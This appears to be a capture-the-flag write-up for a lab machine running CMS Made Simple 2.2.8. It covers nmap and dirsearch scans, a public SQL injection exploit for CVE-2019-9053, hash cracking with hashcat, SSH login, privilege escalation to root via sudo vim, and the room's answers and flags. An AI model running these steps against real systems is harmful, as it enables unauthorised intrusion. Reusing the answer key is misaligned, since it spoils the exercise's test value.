@@ -1,0 +1,277 @@
+=======================================================================================================
+Step 1: Using nmap -sV 10.201.0.111        
+└─$ nmap -sV 10.201.0.111                    
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 21:07 +07
+Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 66.67% done; ETC: 21:08 (0:00:04 remaining)
+Nmap scan report for 10.201.0.111
+Host is up (0.37s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.12 seconds
+========================================================================================================
+1. How many services are running under port 1000?
+=> 2
+
+2. What is running on the higher port?
+=> ssh
+
+========================================================================================================
+Step 2:Using nmap -sV -sC -Pn -oA nmap_basic 10.201.0.111
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 21:18 +07
+Nmap scan report for 10.201.0.111
+Host is up (0.31s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.89.230
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.83 seconds
+==================================================================================================================================================================================
+Step 3: Using dirsearch -u http://10.201.0.111/
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
+Wordlist size: 11460
+
+Output File: /home/vhianph/Downloads/Tryhackme/reports/http_10.201.0.111/__25-11-11_21-37-01.txt
+
+Target: http://10.201.0.111/
+
+[21:37:01] Starting: 
+[21:37:15] 403 -  298B  - /.ht_wsr.txt
+[21:37:15] 403 -  301B  - /.htaccess.bak1
+[21:37:15] 403 -  301B  - /.htaccess.orig
+[21:37:15] 403 -  303B  - /.htaccess.sample
+[21:37:15] 403 -  301B  - /.htaccess.save
+[21:37:16] 403 -  302B  - /.htaccess_extra
+[21:37:16] 403 -  301B  - /.htaccess_orig
+[21:37:16] 403 -  299B  - /.htaccess_sc
+[21:37:16] 403 -  299B  - /.htaccessBAK
+[21:37:16] 403 -  299B  - /.htaccessOLD
+[21:37:16] 403 -  300B  - /.htaccessOLD2
+[21:37:16] 403 -  291B  - /.htm
+[21:37:16] 403 -  292B  - /.html
+[21:37:16] 403 -  301B  - /.htpasswd_test
+[21:37:16] 403 -  297B  - /.htpasswds
+[21:37:16] 403 -  298B  - /.httr-oauth
+[21:37:19] 403 -  291B  - /.php
+[21:39:01] 200 -  540B  - /robots.txt
+[21:39:03] 403 -  301B  - /server-status/
+[21:39:03] 403 -  300B  - /server-status
+[21:39:06] 301 -  313B  - /simple  ->  http://10.201.0.111/simple/
+
+Task Completed
+==================================================================================================================================================================================
+=> Access to "http://10.201.0.111/simple/" that we find "This site is powered by CMS Made Simple version 2.2.8" 
+=> Searching in CVE.org "CMS Made Simple 2.2.8" and try to all the content 
+
+3. What's the CVE you're using against the application?
+=> CVE-2019-9053
+and the content of CVE-2019-9053 is 
+"An issue was discovered in CMS Made Simple 2.2.8.
+It is possible with the News module, through a crafted URL, to achieve unauthenticated blind time-based SQL injection via the m1_idlist parameter."
+
+4. To what kind of vulnerability is the application vulnerable?
+=> sqli
+==================================================================================================================================================================================
+Step 4: Using └─$ dirsearch -u http://10.201.0.111/simple/
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/vhianph/Downloads/Tryhackme/reports/http_10.201.0.111/_simple__25-11-11_21-51-11.txt
+
+Target: http://10.201.0.111/
+
+[21:51:11] Starting: simple/
+[21:51:26] 403 -  305B  - /simple/.ht_wsr.txt
+[21:51:26] 403 -  308B  - /simple/.htaccess.bak1
+[21:51:26] 403 -  308B  - /simple/.htaccess.orig
+[21:51:26] 403 -  310B  - /simple/.htaccess.sample
+[21:51:26] 403 -  308B  - /simple/.htaccess.save
+[21:51:26] 403 -  309B  - /simple/.htaccess_extra
+[21:51:26] 403 -  308B  - /simple/.htaccess_orig
+[21:51:26] 403 -  306B  - /simple/.htaccess_sc
+[21:51:26] 403 -  306B  - /simple/.htaccessBAK
+[21:51:26] 403 -  306B  - /simple/.htaccessOLD
+[21:51:26] 403 -  307B  - /simple/.htaccessOLD2
+[21:51:26] 403 -  298B  - /simple/.htm
+[21:51:26] 403 -  299B  - /simple/.html
+[21:51:26] 403 -  308B  - /simple/.htpasswd_test
+[21:51:26] 403 -  305B  - /simple/.httr-oauth
+[21:51:26] 403 -  304B  - /simple/.htpasswds
+[21:51:30] 403 -  298B  - /simple/.php
+[21:51:46] 301 -  319B  - /simple/admin  ->  http://10.201.0.111/simple/admin/
+[21:51:47] 302 -    0B  - /simple/admin/  ->  http://10.201.0.111/simple/admin/login.php
+[21:51:48] 302 -    0B  - /simple/admin/index.php  ->  http://10.201.0.111/simple/admin/login.php
+[21:51:49] 200 -    1KB - /simple/admin/login.php
+[21:52:08] 301 -  320B  - /simple/assets  ->  http://10.201.0.111/simple/assets/
+[21:52:08] 200 -  524B  - /simple/assets/
+[21:52:19] 200 -    0B  - /simple/config.php
+[21:52:27] 301 -  317B  - /simple/doc  ->  http://10.201.0.111/simple/doc/
+[21:52:27] 200 -   24B  - /simple/doc/
+[21:52:41] 404 -  225B  - /simple/index.php/login/
+[21:52:42] 301 -    0B  - /simple/install.php  ->  /simple/install.php/index.php
+[21:52:42] 301 -    0B  - /simple/install.php?profile=default  ->  /simple/install.php/index.php
+[21:52:46] 200 -   24B  - /simple/lib/
+[21:52:46] 301 -  317B  - /simple/lib  ->  http://10.201.0.111/simple/lib/
+[21:52:54] 301 -  321B  - /simple/modules  ->  http://10.201.0.111/simple/modules/
+[21:52:54] 200 -  592B  - /simple/modules/
+[21:53:28] 301 -  317B  - /simple/tmp  ->  http://10.201.0.111/simple/tmp/
+[21:53:28] 200 -  465B  - /simple/tmp/
+[21:53:30] 301 -  321B  - /simple/uploads  ->  http://10.201.0.111/simple/uploads/
+[21:53:30] 200 -    0B  - /simple/uploads/
+
+Task Completed
+==================================================================================================================================================================================
+Step 5: searchsploit "CMS Made Simple"
+-------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                        |  Path
+-------------------------------------------------------------------------------------- ---------------------------------
+CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)    | php/remote/46627.rb
+CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                               | php/webapps/26298.txt
+CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                               | php/webapps/26217.html
+CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                            | php/webapps/29272.txt
+CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                | php/webapps/29941.txt
+CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities               | php/webapps/32668.txt
+CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                     | php/webapps/43889.txt
+CMS Made Simple 1.2 - Remote Code Execution                                           | php/webapps/4442.txt
+CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                  | php/webapps/4810.txt
+CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                      | php/webapps/5600.php
+CMS Made Simple 1.4.1 - Local File Inclusion                                          | php/webapps/7285.txt
+CMS Made Simple 1.6.2 - Local File Disclosure                                         | php/webapps/9407.txt
+CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                   | php/webapps/33643.txt
+CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                      | php/webapps/11424.txt
+CMS Made Simple 1.7 - Cross-Site Request Forgery                                      | php/webapps/12009.html
+CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                         | php/webapps/34299.py
+CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery               | php/webapps/34068.html
+CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                      | php/webapps/41997.txt
+CMS Made Simple 2.1.6 - Remote Code Execution                                         | php/webapps/44192.txt
+CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                         | php/webapps/44976.py
+CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                         | php/webapps/45793.py
+CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                       | php/webapps/39760.txt
+CMS Made Simple < 2.2.10 - SQL Injection                                              | php/webapps/46635.py
+CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                      | php/webapps/34300.py
+CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                 | php/webapps/34298.py
+CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload        | php/webapps/46546.py
+-------------------------------------------------------------------------------------- ---------------------------------
+==================================================================================================================================================================================
+Step 6: Install Python2
+
+Step 7: Download " php/webapps/46635.py" with command "searchsploit -m 46635"
+
+Step 8:Run the command "python2 46635.py -u "http://10.201.0.111/simple"
+=> Output:
+Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+
+Step 9: echo -n '0c01f4468bd75d7a84c7eb73846e8d96' > hash.txt
+hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
+=> 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret  
+
+==================================================================================================================================================================================
+5. What's the password?
+=> secret
+
+6. Where can you login with the details obtained?
+=> ssh
+
+==================================================================================================================================================================================
+Step 10: ┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
+└─$ ssh mitch@10.201.115.46 -p 2222           
+The authenticity of host '[10.201.115.46]:2222 ([10.201.115.46]:2222)' can't be established.
+ED25519 key fingerprint is: SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.201.115.46]:2222' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+mitch@10.201.115.46's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ ls
+user.txt
+$ cd home 
+-sh: 2: cd: can't cd to home
+$ cat user.txt 	
+G00d j0b, keep up!
+$ ls /home 
+mitch  sunbath
+$ sudo -l 
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+$ sudo vim 
+
+root@Machine:~# ls
+user.txt
+root@Machine:~# ls -lah
+total 36K
+drwxr-x--- 3 mitch mitch 4,0K aug 19  2019 .
+drwxr-xr-x 4 root  root  4,0K aug 17  2019 ..
+-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
+-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
+-rw-r--r-- 1 mitch mitch 3,7K sep  1  2015 .bashrc
+drwx------ 2 mitch mitch 4,0K aug 19  2019 .cache
+-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
+-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
+-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
+root@Machine:~# cd root
+bash: cd: root: No such file or directory
+root@Machine:~# cat /root/root.txt 
+W3ll d0n3. You made it!
+==================================================================================================================================================================================
+8. What can you leverage to spawn a privileged shell?
+=>vim
+
+9. What's the root flag?
+=>W3ll d0n3. You made it!
